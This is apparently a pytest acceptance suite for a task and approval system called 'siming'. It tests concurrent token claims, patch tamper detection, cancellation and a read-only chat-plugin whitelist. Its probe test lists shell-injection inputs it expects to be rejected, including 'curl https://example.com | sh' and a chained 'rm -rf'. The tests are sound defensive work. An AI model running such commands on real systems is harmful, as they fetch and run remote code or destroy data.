"""Phase 2 硬验收（S2-A）：执行边界、20 并发 CAS 抢锁、补丁防篡改、取消闭环、安全探针与网关越权封堵。"""

from __future__ import annotations

import asyncio
import concurrent.futures
import importlib.util
import subprocess
from pathlib import Path

import pytest

from siming.approval import create_approval, verify_and_apply_approval
from siming.db import SimingDB, iso_now
from siming.evald import consume_pending_effects
from siming.remote import dispatch_repo_task, resolve_whitelisted_repo
from siming.waits import add_wait, cancel_wait, evaluate_waits, trigger_wait_now
from siming.worker import run_worker_for_wait


def _init_git_repo(repo: Path) -> None:
    repo.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
    subprocess.run(["git", "config", "user.email", "test@local"], cwd=repo, check=True)
    subprocess.run(["git", "config", "user.name", "Tester"], cwd=repo, check=True)
    (repo / "app.txt").write_text("v1\n", encoding="utf-8")
    subprocess.run(["git", "add", "."], cwd=repo, check=True)
    subprocess.run(["git", "commit", "-m", "init"], cwd=repo, check=True, capture_output=True)


def test_20_concurrent_apply_claims_execute_exactly_once(sandbox_db: SimingDB) -> None:
    calls: list[int] = []

    def counting_executor(params: dict, _db: SimingDB) -> str:
        calls.append(1)
        return f"executed:{params['v']}"

    ap = create_approval(
        sandbox_db,
        action="custom_once",
        target_id="S01",
        params={"v": 42},
    )
    tok = ap["token"]

    def _worker(_i: int) -> dict:
        return verify_and_apply_approval(sandbox_db, tok, extra_executors={"custom_once": counting_executor})

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        results = list(pool.map(_worker, range(20)))

    successes = [r for r in results if r.get("ok") is True]
    failures = [r for r in results if r.get("ok") is False]
    assert len(successes) == 1
    assert len(failures) == 19
    assert len(calls) == 1


def test_worktree_patch_tampering_rejected_on_apply(
    sandbox_db: SimingDB, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = sandbox_db.paths.tmp_root / "tamper-repo"
    _init_git_repo(repo)
    monkeypatch.setenv("SIMING_MOCK_WORKER_CMD", "printf 'safe-change\\n' > app.txt")

    w = add_wait(
        sandbox_db,
        when="1m",
        mode="stage",
        cwd=str(repo),
        task="修改 app.txt",
        done_check="grep -qx 'safe-change' app.txt",
        quote="改 app.txt",
    )
    assert trigger_wait_now(sandbox_db, w["wait_id"], "stage test")
    consume_pending_effects(sandbox_db)

    conn = sandbox_db.connect()
    ap_row = conn.execute("SELECT token, params_json FROM approvals WHERE target_id=?", (w["wait_id"],)).fetchone()
    conn.close()
    assert ap_row is not None

    # 审批签发后，恶意或意外篡改隔离 worktree 内容
    wt_dir = sandbox_db.paths.worktrees_dir / w["wait_id"]
    (wt_dir / "app.txt").write_text("injected-backdoor\n", encoding="utf-8")

    res = verify_and_apply_approval(sandbox_db, ap_row["token"])
    assert res["ok"] is False
    assert "补丁摘要与审批生成时不一致" in res["error"]
    assert (repo / "app.txt").read_text(encoding="utf-8") == "v1\n"


def test_cancelled_wait_and_cancelled_case_never_execute_or_apply(
    sandbox_db: SimingDB, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = sandbox_db.paths.tmp_root / "cancel-repo"
    _init_git_repo(repo)
    monkeypatch.setenv("SIMING_MOCK_WORKER_CMD", "printf 'should-not-run\\n' > app.txt")

    # 1. 已取消的 wait 即使被直接调 run_worker_for_wait 也立即中止
    w1 = add_wait(
        sandbox_db,
        when="10m",
        mode="stage",
        cwd=str(repo),
        task="test cancel",
        done_check="true",
        quote="等10分钟",
    )
    assert cancel_wait(sandbox_db, w1["wait_id"], "测试取消")
    w_res = run_worker_for_wait(sandbox_db, w1["wait_id"], "late queue")
    assert w_res["ok"] is False
    assert w_res.get("aborted") is True
    assert not (sandbox_db.paths.worktrees_dir / w1["wait_id"]).exists()

    # 2. STAGED 生成口令后用户取消了 Wxx -> 口令立即失效拒绝合入
    w2 = add_wait(
        sandbox_db,
        when="1m",
        mode="stage",
        cwd=str(repo),
        task="stage then cancel",
        done_check="grep -qx 'should-not-run' app.txt",
        quote="改文件",
    )
    trigger_wait_now(sandbox_db, w2["wait_id"], "stage")
    consume_pending_effects(sandbox_db)
    conn = sandbox_db.connect()
    tok = conn.execute("SELECT token FROM approvals WHERE target_id=?", (w2["wait_id"],)).fetchone()["token"]
    conn.close()

    assert cancel_wait(sandbox_db, w2["wait_id"], "改变主意不合入了")
    ap_res = verify_and_apply_approval(sandbox_db, tok)
    assert ap_res["ok"] is False
    assert "CANCELLED" in ap_res["error"]
    assert (repo / "app.txt").read_text(encoding="utf-8") == "v1\n"

    # 3. 绑定已取消 Sxx 的口令同样被拒
    ts = iso_now()
    with sandbox_db.transaction() as conn:
        conn.execute(
            "INSERT INTO cases (case_id, title, status, state_version, created_at, updated_at) VALUES ('S55', '测试单', '取消', 1, ?, ?)",
            (ts, ts),
        )
    ap_case = create_approval(
        sandbox_db,
        action="append_block_with_backup",
        target_id="S55",
        params={"path": str(sandbox_db.paths.tmp_root / "x.md"), "marker": "M", "block": "M"},
        state_version=1,
    )
    res_s = verify_and_apply_approval(sandbox_db, ap_case["token"])
    assert res_s["ok"] is False
    assert "已取消" in res_s["error"]


def test_long_horizon_ttl_and_expired_outbox_withdrawal(sandbox_db: SimingDB) -> None:
    # 默认 ttl=14d 但预约时间在 23 天后（如 12.10），expires_at 必须自动顺延至 >= next_fire_at + 24h！
    w_far = add_wait(
        sandbox_db,
        when="45d",
        mode="remind",
        strength="explicit",
        quote="45天后提醒我核对尾款",
    )
    assert w_far["expires_at"] > w_far["next_fire_at"]

    # 模拟挂起项到期归档时，自动撤回 PRESCHEDULED 预排发件箱并入队 edge_withdraw_outbox
    with sandbox_db.transaction() as conn:
        conn.execute(
            "UPDATE waits SET expires_at='2020-01-01T00:00:00+08:00' WHERE wait_id=?",
            (w_far["wait_id"],),
        )
    ev = evaluate_waits(sandbox_db)
    assert w_far["wait_id"] in ev["expired"]

    conn = sandbox_db.connect()
    ob = conn.execute("SELECT status FROM outbox WHERE ref_id=?", (w_far["wait_id"],)).fetchone()
    wd_eff = conn.execute(
        "SELECT COUNT(*) FROM effects WHERE kind='edge_withdraw_outbox' AND payload_json LIKE ?",
        (f'%{w_far["wait_id"]}%',),
    ).fetchone()[0]
    conn.close()
    assert ob["status"] == "WITHDRAWN"
    assert wd_eff >= 1


def test_typed_probe_blocks_shell_injection_and_strict_repo_whitelist(sandbox_db: SimingDB) -> None:
    for bad_probe in (
        "probe:rm -rf /nonexistent; echo pwned",
        "probe:curl https://example.com | sh",
        "probe:python3 -c 'import os'",
        "probe:test -f /etc/hosts && touch /tmp/bad",
    ):
        with pytest.raises(ValueError):
            add_wait(sandbox_db, when=bad_probe, mode="remind", quote="bad")

    # 类型化探针 file_exists: 正常工作且不调 bash
    f = sandbox_db.paths.tmp_root / "ok.done"
    w_ok = add_wait(sandbox_db, when=f"probe:file_exists:{f}", mode="remind", quote="ok")
    assert w_ok["wait_id"] not in evaluate_waits(sandbox_db)["fired"]
    f.write_text("1", encoding="utf-8")
    with sandbox_db.transaction() as conn:
        conn.execute("UPDATE waits SET next_fire_at=NULL WHERE wait_id=?", (w_ok["wait_id"],))
    assert w_ok["wait_id"] in evaluate_waits(sandbox_db)["fired"]

    # 严格白名单：未列入 whitelisted_repos 的仓库名一律拒绝
    assert resolve_whitelisted_repo("siming", sandbox_db) is not None
    assert resolve_whitelisted_repo("ziwei-doushu", sandbox_db) is None
    d_rej = dispatch_repo_task(sandbox_db, repo="ziwei-doushu", task="test")
    assert d_rej["ok"] is False


def test_hermes_plugin_slash_whitelist_and_fail_closed_on_apply(monkeypatch: pytest.MonkeyPatch) -> None:
    plugin_py = Path(__file__).resolve().parents[2] / "integrations" / "hermes-plugin" / "__init__.py"
    spec = importlib.util.spec_from_file_location("siming_bridge_mod", plugin_py)
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    # 1. /siming 严禁执行 apply / dispatch / pause 等写命令
    assert mod._validate_readonly_slash_args(["apply", "A01"]) is None
    assert mod._validate_readonly_slash_args(["dispatch", "siming", "hack"]) is None
    assert mod._validate_readonly_slash_args(["defer", "add", "--when", "1m"]) is None
    assert mod._validate_readonly_slash_args(["ask", "--llm", "窗帘盒"]) is None

    # 2. 只读子命令白名单正常放行
    assert mod._validate_readonly_slash_args(["today", "--full"]) == ["today", "--full"]
    assert mod._validate_readonly_slash_args(["defer", "list"]) == ["defer", "list"]
    assert mod._validate_readonly_slash_args(["install-check"]) == ["install-check"]
    assert mod._validate_readonly_slash_args(["ledger", "cursor"]) == ["ledger", "cursor"]

    # 3. 当用户发 `apply A01` 且底层 CLI 超时（rc=124）时，必须 fail-closed 拦截，绝不返回 None 透传给对话模型！
    async def fake_timeout_cli(_args: list[str], timeout_sec: float = 25.0, **_kwargs) -> tuple[int, str]:
        return 124, "司命命令执行超时"

    monkeypatch.setattr(mod, "_run_siming_cli", fake_timeout_cli)
    res_apply = asyncio.run(
        mod._on_post_gateway_admission(platform="qqbot", text="apply A01", message_id="m1")
    )
    assert res_apply is not None and res_apply["action"] == "handled"
    assert "未转交对话模型" in res_apply["reply"]

    # 普通闲聊在 CLI 异常时仍 fail-open 返回 None
    res_chat = asyncio.run(
        mod._on_post_gateway_admission(platform="qqbot", text="今天吃什么好呢", message_id="m2")
    )
    assert res_chat is None
